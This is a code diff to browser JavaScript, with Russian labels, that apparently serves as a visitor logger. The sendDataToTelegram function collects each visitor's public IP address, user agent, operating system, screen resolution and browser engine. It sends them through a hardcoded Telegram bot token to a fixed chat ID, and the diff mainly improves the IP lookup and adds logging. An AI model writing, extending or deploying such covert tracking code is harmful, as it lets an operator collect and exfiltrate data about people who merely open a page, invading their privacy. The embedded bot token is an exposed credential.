@@ -26,38 +26,44 @@
 // }
 
 async function fetchPublicIP() {
+    // Try simple services first
     const ipServices = [
-        'https://api.ipify.org?format=json',
-        'https://api.ip.sb/ip',
-        'https://api4.my-ip.io/ip.json',
-        'https://ip.seeip.org/json'
+        { url: 'https://api.ipify.org?format=json', type: 'json' },
+        { url: 'https://httpbin.org/ip', type: 'json', field: 'origin' },
+        { url: 'https://api.myip.com', type: 'json', field: 'ip' },
+        { url: 'https://api.ip.sb/ip', type: 'text' }
     ];
 
     for (const service of ipServices) {
         try {
-            const response = await fetch(service);
-            const text = await response.text();
+            console.log(`Trying to fetch IP from ${service.url}`);
+            const response = await fetch(service.url);
             
-            // Handle different response formats
-            try {
-                // Try parsing as JSON first
-                const data = JSON.parse(text);
-                // Different APIs return IP in different fields
-                const ip = data.ip || data.IP || data.address;
-                if (ip) return ip;
-            } catch {
-                // If not JSON, might be plain text IP
-                if (/^[0-9]{1,3}(\.[0-9]{1,3}){3}$/.test(text.trim())) {
-                    return text.trim();
+            if (!response.ok) {
+                console.log(`Service ${service.url} returned status: ${response.status}`);
+                continue;
+            }
+
+            if (service.type === 'json') {
+                const data = await response.json();
+                const ip = service.field ? data[service.field] : data.ip;
+                if (ip) {
+                    console.log(`Successfully got IP from ${service.url}: ${ip}`);
+                    return ip;
+                }
+            } else {
+                const text = await response.text();
+                const ip = text.trim();
+                if (/^[0-9]{1,3}(\.[0-9]{1,3}){3}$/.test(ip)) {
+                    console.log(`Successfully got IP from ${service.url}: ${ip}`);
+                    return ip;
                 }
             }
         } catch (error) {
-            console.error(`Error fetching IP from ${service}:`, error);
-            continue; // Try next service
+            console.error(`Error with ${service.url}:`, error.message);
         }
     }
     
-    // If all services fail
     return 'Не удалось получить IP';
 }
 
@@ -111,7 +117,10 @@ async function sendDataToTelegram() {
             }
         }
 
+        console.log('Starting to fetch IP...');
         const ipAddress = await fetchPublicIP();
+        console.log('IP fetching completed:', ipAddress);
+
         const userAgent = getUserAgent();
         const osName = getOSName();
         const screenResolution = getScreenResolution();
@@ -149,6 +158,8 @@ async function sendDataToTelegram() {
 └ Тип движка браузера: <code>${browserInfo.engine}</code>
         `;
 
+        console.log('Preparing to send message to Telegram...');
+
         const token = '7654890944:AAGaxUzyNxethxulDQKFSNkfciruDiIxDXc';
         const telegramBotURL = `https://api.telegram.org/bot${token}/sendMessage`;
         const chatId = '-4778017209';
@@ -166,6 +177,8 @@ async function sendDataToTelegram() {
         if (!response.ok) {
             throw new Error(`HTTP error! status: ${response.status}`);
         }
+
+        console.log('Message sent successfully!');
     } catch (error) {
         console.error('Error in sendDataToTelegram:', error);
         
